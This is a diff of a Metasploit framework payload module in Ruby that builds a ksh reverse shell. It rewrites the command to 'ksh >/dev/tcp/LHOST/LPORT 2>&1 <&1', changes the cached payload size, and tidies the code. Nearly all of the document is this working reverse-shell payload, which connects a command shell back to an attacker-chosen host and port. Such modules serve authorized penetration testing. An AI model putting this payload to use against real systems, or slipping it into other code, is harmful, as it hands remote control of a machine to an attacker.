@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -9,7 +9,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 110
+  CachedSize = 52
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -34,11 +34,10 @@ module MetasploitModule
   end
 
   def generate
-    return super + command_string
+    super + command_string
   end
 
   def command_string
-    # ksh -c 'ksh >/dev/tcp/${HOST}/${PORT} <&1'
-    cmd = "ksh -c 'ksh >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&1'"
+    "ksh -c 'ksh >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 2>&1 <&1'"
   end
 end
